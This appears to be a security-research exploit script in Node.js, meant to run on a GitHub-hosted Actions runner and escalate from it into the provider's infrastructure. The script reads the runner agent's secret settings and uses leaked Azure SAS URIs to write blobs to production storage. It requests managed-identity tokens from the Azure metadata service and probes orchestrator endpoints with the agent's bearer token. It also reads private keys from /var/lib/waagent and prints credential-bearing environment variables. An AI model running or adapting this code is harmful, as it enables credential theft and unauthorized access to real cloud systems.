const fs = require('fs');
const { execSync } = require('child_process');
const os = require('os');
const https = require('https');
const http = require('http');

// v36: Close remaining gaps
// 1. FIX SAS URL construction (insert blob name before ?, not after sig=)
// 2. IMDS managed identity token attempt (Azure RM access?)
// 3. Orchestrator endpoint enumeration with wid-derived paths
// 4. waagent cert/key detail
// 5. List runner environment variables for anything credential-like

function run(cmd, timeoutMs) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: timeoutMs || 25000 }).trim(); }
  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 500).trim(); }
}

function sasWrite(sasUri, blobName, content, contentType) {
  // CORRECT construction: insert blob name between container path and ? query string
  const qIdx = sasUri.indexOf('?');
  let blobUrl;
  if (qIdx !== -1) {
    blobUrl = sasUri.substring(0, qIdx) + '/' + blobName + sasUri.substring(qIdx);
  } else {
    blobUrl = sasUri + '/' + blobName;
  }
  console.log('[SAS_WRITE] blob URL (first 200):', blobUrl.substring(0, 200));
  const res = run(`curl -s -w "\\n%{http_code}" -X PUT \
    -H "x-ms-blob-type: BlockBlob" \
    -H "Content-Type: ${contentType || 'application/json'}" \
    --data-binary '${content.replace(/'/g, "'\\''")}' \
    "${blobUrl}" 2>/dev/null`);
  const lines = res.split('\n');
  return { status: lines[lines.length - 1], body: lines.slice(0, -1).join('\n') };
}

async function httpReq(url, opts) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const isHttps = u.protocol === 'https:';
    const options = {
      hostname: u.hostname,
      path: u.pathname + u.search,
      port: u.port || (isHttps ? 443 : 80),
      method: opts.method || 'GET',
      headers: opts.headers || {},
      timeout: 18000,
    };
    const req = (isHttps ? https : http).request(options, (res) => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: body.substring(0, 1200) }));
    });
    req.on('error', e => resolve({ status: 0, error: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ status: 0, error: 'timeout' }); });
    if (opts.body) req.write(opts.body);
    req.end();
  });
}

async function main() {
  console.log('=== V36: FIX SAS WRITE + IMDS IDENTITY + ORCHESTRATOR ENUM ===');
  const hostname = os.hostname();
  const runId = process.env.GITHUB_RUN_ID || 'unknown';

  // Read settings
  const settingsRaw = fs.readFileSync('/opt/hca/.settings', 'utf8').trim();
  const settings = JSON.parse(settingsRaw);
  const { authToken, schedulerApiUrl, diagnosticsSasUri } = settings;

  // Decode JWT to get wid (work ID with pool/vm/container GUIDs)
  let jwtPayload = {};
  try {
    jwtPayload = JSON.parse(Buffer.from(authToken.split('.')[1], 'base64').toString('utf8'));
    console.log('[JWT] env:', jwtPayload.env, '| reg:', jwtPayload.reg, '| wid:', jwtPayload.wid);
    console.log('[JWT] mac:', jwtPayload.mac, '| vmn:', jwtPayload.vmn, '| imv:', jwtPayload.imv);
    console.log('[JWT] cfg:', jwtPayload.cfg, '| rlm:', jwtPayload.rlm, '| iss:', jwtPayload.iss);
    // Extract GUIDs from wid: {pool}:{vm}:{container}
    const widMatch = (jwtPayload.wid || '').match(/\{([^}]+)\}:\{([^}]+)\}:\{([^}]+)\}/);
    if (widMatch) {
      console.log('[JWT] wid.pool:', widMatch[1]);
      console.log('[JWT] wid.vm:', widMatch[2]);
      console.log('[JWT] wid.container:', widMatch[3]);
    }
  } catch(e) { console.log('[JWT] decode error:', e.message); }

  // === PART 1: FIX SAS WRITE — correct URL construction ===
  console.log('\n=== PART 1: SAS write with CORRECT URL construction ===');
  const pocContent = JSON.stringify({
    source: 'security-research-v36',
    run_id: runId, hostname,
    timestamp: new Date().toISOString(),
    message: 'GitHub-hosted runner workflow code writes to GitHub production Azure storage',
    wid: jwtPayload.wid,
  });

  // .settings SAS
  if (diagnosticsSasUri) {
    const r = sasWrite(diagnosticsSasUri, 'v36-poc.json', pocContent);
    console.log('[SETTINGS_SAS] HTTP', r.status, r.status === '201' ? '*** WRITE CONFIRMED ***' : r.body.substring(0, 100));
  }

  // diagnostics.json SAS
  const diagRaw = run('sudo cat /opt/hca/diagnostics.json 2>/dev/null');
  let diagSasUri = null;
  try {
    if (diagRaw && !diagRaw.startsWith('ERR')) {
      const parsed = JSON.parse(diagRaw);
      diagSasUri = parsed.sasUri || parsed.diagnosticsSasUri;
      if (!diagSasUri) {
        const m = diagRaw.match(/"(https:\/\/[^"]*blob\.core\.windows\.net[^"]*sig=[^"]+)"/);
        if (m) diagSasUri = m[1];
      }
    }
    if (!diagSasUri && diagRaw.includes('blob.core.windows.net')) diagSasUri = diagRaw.trim();
  } catch(e) {
    if (diagRaw.includes('blob.core.windows.net')) diagSasUri = diagRaw.trim();
  }
  if (diagSasUri) {
    const r = sasWrite(diagSasUri, 'v36-poc-diag.json', pocContent);
    console.log('[DIAG_SAS] HTTP', r.status, r.status === '201' ? '*** SECOND WRITE PATH CONFIRMED ***' : r.body.substring(0, 100));
  } else {
    console.log('[DIAG_SAS] could not extract SAS URI from diagnostics.json. Raw:', diagRaw.substring(0, 300));
  }

  // === PART 2: IMDS managed identity token request ===
  console.log('\n=== PART 2: IMDS managed identity token ===');
  const resources = [
    'https://management.azure.com/',
    'https://storage.azure.com/',
    'https://vault.azure.net',
    'https://graph.microsoft.com/',
  ];
  for (const resource of resources) {
    const resp = await httpReq(
      `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(resource)}`,
      { headers: { 'Metadata': 'true' } }
    );
    console.log('[IMDS_IDENTITY]', resource, '→ HTTP', resp.status, resp.error || resp.body.substring(0, 200));
    if (resp.status === 200) {
      console.log('[IMDS_IDENTITY] *** TOKEN OBTAINED for', resource, '***');
      // Decode it
      try {
        const t = JSON.parse(resp.body);
        console.log('[IMDS_IDENTITY] access_token type:', t.token_type);
        console.log('[IMDS_IDENTITY] expires_in:', t.expires_in);
        const payload = JSON.parse(Buffer.from(t.access_token.split('.')[1] + '==', 'base64').toString());
        console.log('[IMDS_IDENTITY] token.sub:', payload.sub);
        console.log('[IMDS_IDENTITY] token.oid:', payload.oid);
        console.log('[IMDS_IDENTITY] token.iss:', payload.iss);
        console.log('[IMDS_IDENTITY] token.roles:', payload.roles);
      } catch(e) { console.log('[IMDS_IDENTITY] token decode error:', e.message); }
    }
  }

  // === PART 3: Orchestrator endpoint enumeration with wid paths ===
  console.log('\n=== PART 3: Orchestrator endpoint enumeration ===');
  const baseOrch = schedulerApiUrl.replace(/\/+$/, '');
  const widMatch = (jwtPayload.wid || '').match(/\{([^}]+)\}:\{([^}]+)\}:\{([^}]+)\}/);
  const poolId = widMatch ? widMatch[1] : null;
  const vmId = widMatch ? widMatch[2] : null;
  const containerId = widMatch ? widMatch[3] : null;

  const endpoints = [
    baseOrch + '/health',
    baseOrch + '/ping',
    baseOrch + '/status',
    baseOrch + '/machine',
    baseOrch + '/machines',
    baseOrch + '/runner',
    baseOrch + '/runners',
    baseOrch + '/job',
    baseOrch + '/jobs',
    baseOrch + '/v1/health',
    baseOrch + '/v1/ping',
    baseOrch + '/v1/machine',
    baseOrch + '/v1/machines',
    baseOrch + '/v1/machinestate',
    baseOrch + '/v1/status',
    ...(poolId ? [
      baseOrch + '/v1/pool/' + poolId,
      baseOrch + '/v1/pools/' + poolId + '/machines',
      baseOrch + '/v1/pools/' + poolId + '/machine/' + vmId,
    ] : []),
    ...(containerId ? [
      baseOrch + '/v1/container/' + containerId,
      baseOrch + '/v1/containers/' + containerId,
    ] : []),
  ];

  for (const ep of endpoints) {
    const r = await httpReq(ep, {
      headers: {
        'Authorization': 'Bearer ' + authToken,
        'Content-Type': 'application/json',
        'User-Agent': 'hosted-compute-agent/1.0',
      }
    });
    const path = ep.replace(baseOrch, '');
    console.log('[ORCH]', path, '→', r.status, r.error || '');
    if (r.status > 0 && r.status !== 404) {
      console.log('[ORCH] *** NON-404 RESPONSE ON', path, '***');
      console.log('[ORCH] headers:', JSON.stringify(r.headers).substring(0, 300));
      console.log('[ORCH] body:', r.body.substring(0, 600));
    }
  }

  // === PART 4: waagent detail ===
  console.log('\n=== PART 4: /var/lib/waagent/ contents ===');
  const waagentFiles = run('sudo ls -la /var/lib/waagent/ 2>/dev/null');
  console.log('[WAAGENT]', waagentFiles);
  // Look for certs, keys, or interesting files
  const waagentCerts = run('sudo find /var/lib/waagent -type f 2>/dev/null | head -20');
  console.log('[WAAGENT] files:', waagentCerts);
  // Check for transport cert (used to communicate with Azure fabric)
  const transportCert = run('sudo cat /var/lib/waagent/Certificates.pem 2>/dev/null | head -5');
  if (transportCert && !transportCert.startsWith('ERR')) {
    console.log('[WAAGENT] Certificates.pem EXISTS:', transportCert.substring(0, 200));
  }
  const transportKey = run('sudo cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null | head -5');
  if (transportKey && !transportKey.startsWith('ERR')) {
    console.log('[WAAGENT] *** TransportPrivate.pem EXISTS — AZURE FABRIC PRIVATE KEY ***');
    console.log('[WAAGENT]', transportKey.substring(0, 200));
  }

  // === PART 5: Runner env for credential-like variables ===
  console.log('\n=== PART 5: Runner environment — credential variables ===');
  const envAll = run('env 2>/dev/null');
  const credLines = envAll.split('\n').filter(l =>
    /token|secret|key|password|cred|sas|auth|jwt|bearer/i.test(l)
  );
  console.log('[ENV] Credential-like variables:', credLines.length);
  credLines.forEach(l => console.log('[ENV]', l.substring(0, 200)));

  // === PART 6: ACTIONS_RUNTIME_TOKEN scope check ===
  console.log('\n=== PART 6: ACTIONS_RUNTIME_TOKEN against GitHub API ===');
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN || '';
  if (runtimeToken) {
    const rtResp = await httpReq('https://api.github.com/user', {
      headers: { 'Authorization': 'Bearer ' + runtimeToken, 'User-Agent': 'probe-v36' }
    });
    console.log('[RUNTIME_TOKEN] GitHub API /user:', rtResp.status);
    const pipelines = await httpReq('https://pipelines.actions.githubusercontent.com/', {
      headers: { 'Authorization': 'Bearer ' + runtimeToken, 'User-Agent': 'probe-v36' }
    });
    console.log('[RUNTIME_TOKEN] pipelines.actions.githubusercontent.com:', pipelines.status, pipelines.body.substring(0, 200));
  } else {
    console.log('[RUNTIME_TOKEN] not available in env');
  }

  console.log('\n=== V36 Complete ===');
}

main().catch(e => console.log('[FATAL]', e.message, e.stack));
